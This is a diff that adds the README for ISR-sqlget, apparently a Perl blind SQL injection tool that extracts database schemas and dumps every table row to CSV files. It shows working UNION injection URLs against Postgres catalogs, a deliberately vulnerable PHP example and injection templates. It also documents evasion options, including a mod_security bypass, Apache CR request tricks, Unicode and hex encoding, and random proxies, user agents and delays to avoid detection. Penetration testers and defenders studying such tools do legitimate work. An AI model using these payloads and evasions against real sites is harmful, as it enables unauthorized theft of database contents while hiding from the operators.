@@ -1,0 +1,387 @@
+-- ISR - Infobyte Security Research
+-- | ISR-sqlget | www.infobyte.com.ar |
+
+
+..:: DESCRIPTION
+
+ISR-sqlget: It's a blind SQL injection tool developed in Perl.
+It lets you get databases schemas and tables rows.
+Using a single GET/POST you can access quietly the database structure 
+and using a single GET/POST you can dump every table row to a csv-like file.
+
+Databases supported:
+
+    - IBM DB2
+    - Microsoft SQL Server
+    - Oracle
+    - Postgres
+    - Mysql
+    - IBM Informix
+    - Sybase
+    - Hsqldb (www.hsqldb.org)
+    - Mimer (www.mimer.com)
+    - Pervasive (www.pervasive.com)
+    - Virtuoso (virtuoso.openlinksw.com)
+    - SQLite
+    - Interbase/Yaffil/Firebird (Borland)
+    - H2 (http://www.h2database.com)
+    - Mckoi (http://mckoi.com/database/)
+    - Ingres (http://www.ingres.com)
+    - MonetDB (http://www.monetdb.nl)
+    - MaxDB (www.mysql.com/products/maxdb/)
+    - ThinkSQL (http://www.thinksql.co.uk/)    
+    - SQLBase (http://www.unify.com)
+
+Evasion features:
+
+    - Full-width/Half-width Unicode encoding
+    - Apache non standard CR bypass
+    - mod_security bypass
+    - Random uppercase request transform
+    - PHP Magicquotes: encode every string using db CHR function or similar.
+    - Convert requests to hexadecimal values
+    - Avoid non-space replacing for /**/ or (\t) tab 
+    - Avoid non || or + concatenation using db concat function or similar.
+    - Random user-agent
+    - Random proxy-server
+    - Random delay request
+
+Common features:
+
+    - Database schemate download blacklist
+    - Cookie array support
+    - SSL support
+    - Proxy server support
+    - Database information dumped in csv format
+
+Reporting:
+
+    - Database structure graphication to create impact executive reports
+    require Graphviz library (http://www.graphviz.org/)
+
+..:: USE
+
+The tool need the following information:
+- <ACTION>  : Action to do?
+- <SESSION> : Where?
+
+The possible ACTIONs are:
+
+    First:
+	1. Get the database schema.
+
+    Then:
+	2.a Get the tables rows(csv format).
+	2.b Get graphic database schema.
+
+..::Example: 
+
+Target:
+http://target.infobyte.com.ar/helloworld.php?id=<SQL-INJECT>
+
+helloworld.php source:
+<?
+$id = $_REQUEST['id'];
+
+$sql= 'select name from clients where id='.$id;
+exec_sql($sql);
+
+ print "Results";
+ print "<table>";
+ while ($tr = $database->fetch_row()) {
+    print "<tr><td>";
+    print $tr['name'];
+    print "</td></tr>";
+ }
+ print "</table>";
+?>
+
+Read the session example (config file):
+./helloworld.pm
+
+Get the database schema:
+
+; bash# ./ISR-sqlget.pl -s -n helloworld
+; --------------------------------------------------
+; Action: Get dbschema, Session name: helloworld
+; --------------------------------------------------
+; 
+; http://target.infobyte.com.ar/helloworld.php?id=,id=1  union select 1,COALESCE((select nspname from pg_namespace 
+; where a.relnamespace =pg_namespace.oid),'0'::text)||'[__]'||COALESCE(relname,'0'::text)||'[__]'||COALESCE(attname,'0'::text);
+; ||'[__]'||COALESCE((select typname from pg_type where oid=b.atttypid),'0'::text) from (pg_attribute b JOIN pg_class a ON 
+; (a.oid = b.attrelid)) where (attnum > 0 and ((a.relkind = 'r'::"char") OR (a.relkind = 's'::"char")))  --'
+; from sqlite_master where type='table'  --,GET
+; 
+; bash#
+ 
+This generate a local schema file in:
+./template/helloworld.dbschema
+
+Then get the tables rows:
+
+; bash# ./ISR-sqlget.pl -d -n helloworld
+;--------------------------------------------------
+;Action: Get DBDATA, Session name: helloworld
+;--------------------------------------------------
+;--------------------------------------------------
+;Action: Get DBDATA, Session name: helloworld, DbSchema: helloworld.dbschema
+;--------------------------------------------------
+;------------------------------------------------------------------------------------------------------------------------------------------------------
+;http://target.infobyte.com.ar/helloworld.php?id=,id=1 union all select id||'[__]'||name||'[__]'||address from
+;company.clients   --,GET
+;Save source table: ./datos/helloworld.company.clients.sql.html
+;Save csv table: ./datos/helloworld.company.clients.csv
+;------------------------------------------------------------------------------------------------------------------------------
+;.....
+
+In the directory "./datos/" you will have two files per table as the following: 
+
+[sessionname].[database].[table].sql.html  # html source
+[sessionname].[database].[table].csv 	   # commad separated values
+
+Note that "./datos" can be specified with the parameter $conf::outputdb in the session
+config file.
+
+..:: Advanced
+
+The tool uses only one column type text/varchar/etc in SELECT sql consult.
+Using UNION setences you can get "in that column" all the database schema using "[__]" as delimiter.
+
+When you have already saved the local database schema, you will be able to:
+
+1.a Get the tables rows:
+    Using the same technique you can get the all the rows of every table in the database,
+    the datatypes columns that are not compatible with text are transform into datatype text
+    using own database functions.
+
+1.b Get database schema graphic.
+
+The tool uses for each action a session config file.
+This config file defines the necesary parameters to exploit the sqlinjection.
+The parameter @conf::path specifies the way that raw html is parsed to work with the tool.
+
+Help details:
+
+ Usage: ./ISR-sqlget.pl [ACTION] [OPTIONS]
+
+Action:
+    -c:  Check parser module
+    -t:  Get test page
+    -a:  Get all database names (only mssql)
+    -s:  Get database/s structure/s
+    -d:  Get database/s information/s (csv format)
+    -g:  Graphic structure of database (gif format)
+			
+			
+Options:
+    -n:  Session name
+    -p: (Use with -c action, specify src page to check the module);
+	Default ./template/$SESSION.testpage
+    -v:  Verbose
+    -h:  Help
+
+
+-t: Using the session file you get a short data system table to be used
+    with the action "-c" to parse the raw html later.
+
+-c: By default use ./template/[session-name].testpage. It is used to develope and test
+    the raw html parser.
+    You can choose other html file using the "-p" option.
+    
+-a: All DB engines do use the following order to get the tables rows:
+    1. "-s" get structure (It saves the database schema in a local file).
+    2. "-d" get tables data.
+    
+    Because of MSSQL system tables we have to add a previous step:
+    1. "-a" Get all database names of /schema/catalog (It saves the names in a local file).
+    2. "-s" get structure (It saves the database schema in a local file).
+    3. "-d" get tables data.
+
+-s: get structure (It saves the database schema in a local file).    
+-d: get tables data.
+
+-g: Using the local database schema file previously obtained to 
+    get database graphic schema (gif format)
+    
+-n: It specifies the name of session config file.
+    
+..:: Notes
+
+./pmschanges.txt: We use modificated version of LWP, Net::HTTP that includes methods and CRLs specifications
+		  This file explains the modifications.
+		  
+./dbs/isr_*: Every database module has the @space variable that specifies the type of valid space.
+	     Example:
+		my @space=(' ',"\t","/**/"); #all spaces
+
+..:: Session file options:
+
+@conf::path #The parameter @conf::path specifies the way that raw html is parsed to work with the tool.
+	    #It uses embedded perl code with HTML::TreeBuilder to parse the raw html
+	    #The first configuration is a tree array with the html tags names needed. 
+	    The last html tag name is processed with the perl code.
+
+See examples in ./examples/
+example[n].html
+session[n].pm
+
+$conf::site 	#Site where the vulnerable app is
+
+$conf::script 	#Script file vulnerable
+
+$conf::method 	#Method 'POST', 'GET', 'HELLO', '\r\n\r\n\r\n\r\n\r\n' (apache method bypass)
+
+$conf::inj 	#POST/GET parameters with the UNION senteces
+		#It uses variables that later will be replace with the dynamic information.
+
+    Variables:
+    <VALUE> = Column used to get all the information.
+    <TABLE> = Tables section.
+    <WHERE> = Where section.
+    <TAIL>  = The last part of the sql sentence.
+
+    Example: "id=1') union select <VALUE>,'a' from <TABLE> <WHERE> <TAIL> --";
+
+$conf::where 	#If you need to add some exception in the union table you have to use this
+		#parameter because there are some database structure queries that have "WHERE" included
+		
+$conf::tail  	#The last part of the sql sentence.
+$conf::param  	#Parameter style = Post style 1, Url style 0
+    Post style=
+    ;root@isr-slackware:~/dev# telnet localhost 80
+    ;Trying 127.0.0.1...
+    ;Connected to localhost.
+    ;Escape character is '^]'.
+    ;GET http://site/aaa.php HTTP/1.0
+    ;id=aaa
+
+    Url style:
+    ;root@isr-slackware:~/dev# telnet localhost 80
+    ;Trying 127.0.0.1...
+    ;Connected to localhost.
+    ;Escape character is '^]'.
+    ;GET http://site/aaa.php?id=aaa HTTP/1.0
+
+$conf::dbtype #Database backend
+
+    1 - Oracle
+    2 - Microsoft SQL Server
+    3 - Mysql    
+    4 - Postgres
+    5 - IBM DB2
+    6 - Interbase/Yaffil/Firebird (Borland)    
+    7 - Mimer (www.mimer.com)    
+    8 - Virtuoso (virtuoso.openlinksw.com)
+    9 - Pervasive (www.pervasive.com)    
+    10 - Hsqldb (www.hsqldb.org)    
+    11 - SQLite    
+    12 - IBM Informix
+    13 - Sybase
+    14 - H2 (http://www.h2database.com)
+    15 - Mckoi (http://mckoi.com/database/)
+    16 - Ingres (http://www.ingres.com)
+    17 - MonetDB (http://www.monetdb.nl)
+    18 - MaxDB (www.mysql.com/products/maxdb/)
+    19 - ThinkSQL (http://www.thinksql.co.uk/)    
+    20 - SQLBase (http://www.unify.com)
+
+$conf::session #Session name (You have to use the same name of the session config file without .pm extension)
+$conf::outputdb #The path of the dumped tables rows
+
+######### proxy
+$conf::proxy_host #Proxy support example: 'http://user:pass@host:port/'; 
+$conf::rproxy     #Random proxy 1 enable or 0 disable
+$conf::rproxyfile #Proxy random file (Use the same format than $conf::proxy_host)
+
+######### filters
+$conf::space     #Space avoid: 0 enable space or 1 replace space ' ' with tab '\t or 
+		 #2 replace space ' ' with comment '/**/'
+
+
+$conf::apache_espace    #You can specify the CRs value in the HTTP/s request
+
+#Example:
+# Valid apache CRs (\x0b, \x0c, \x0d,)
+# $conf::apache_espace="\x0b,\x0c";  #init=\x0b and end=\x0c
+# Process GET/POST/XXX HTTP request as "GET\x0b/script.php\x0cHTTP/1.0"
+
+$conf::apache_espace_rnd=1;     #random combination of CRs 0x0b, 0x0c, 0x0d
+$conf::apache_espace_rmaxn=10;  #Max random number of characters
+#In this example, we randomize the CRs (0x0b, 0x0c, 0x0d) from 1 to 10:
+#Reference: http://www.osvdb.org/25837
+
+$conf::mod_security 	#1 enable bypass modsecurity <= 2.1.0 & (=>PHP 5.2.0||PERL||Python)
+#Reference: http://www.php-security.org/MOPB/BONUS-12-2007.html
+
+$conf::full_width 	#1 enable bypass full-width encoding
+$conf::ruseragent 	#1 enable use random user agent
+$conf::ruseragentfile 	#User agent file list
+$conf::uagent 		#Default user agent
+$conf::delay  		#Delay between connection
+$conf::rdelay 		#1 enable random maximum delay between connections, use the $conf:delay as max value.
+$conf::magicquotes 	#1 enable avoid magicquotes (use CHR function o simil in each database)
+$conf::convertall_hex 	#1 transform every parameter value in hex format (%41,%61)
+$conf::rnd_uppercase 	#1 enable uppercase random transform.
+
+######## filters only mssql
+$conf::scape_plas 		#1 enable, Use CONCAT function in case of the script can't receive '+' 
+				#(used as string concatenation)
+$conf::convertall_str 		#1 enable convert all columns to string (recommed)
+$conf::scape_output_less 	#1 enable In case the script can't send '|' use database function to be replaced
+
+######## filters only oracle/db2/virtuoso/h2/mckoi/ingres/monetdb/maxdb/thinksql
+$conf::scape_pipe #Use CONCAT function or simil in case the script can't receive '|' (used as string concatenation)
+
+###### deny hash retrieve
+$conf::deny_dbname #array that have the database name not to be processed (blacklist)
+Example value = {'WMSYS' => 1,
+	         'SYS' => 1
+                };
+
+#Cookie
+$conf::cookie #1 enable cookie arraying
+@conf::cookies #array with the cookies to use
+Example value = ( {
+                    version=>undef,
+                    key=>'valu1',
+                    val=>'password',
+                    path=>'',
+                    domain=>'',
+                    port=>undef,
+                    path_spec=>undef,
+                    secure=>undef,
+                    maxage=>undef,
+                    discard=>undef,
+                    rest=>undef
+                    });
+
+#Graphic options (More see GraphViz perl module help)
+$conf::graphdir = './graph/'; #The destination directory of graphics files
+$conf::glayout = 'dot';
+$conf::grootcolor='crimson';
+$conf::gdbcolor='darkgreen';
+$conf::gtablecolor='olivedrab1';
+$conf::gcolumncolor='lightblue2';
+$conf::gcolumn=0; #0= don't graph column 1= graph columns
+						
+..:: REQUIREMENTS
+
+1 - Perl Modules:
+    LWP::UserAgent
+    HTTP::Cookies;
+    Convert::EastAsianWidth
+    Data::Dump
+    GraphViz 
+    
+
+
+2 - Libs
+    GraphViz project (http://www.graphviz.org/)
+
+..:: DOWNLOAD
+
+http://www.infobyte.com.ar/development.html
+
+..:: AUTHOR
+Francisco Amato
+famato+at+infobyte+dot+com+dot+ar
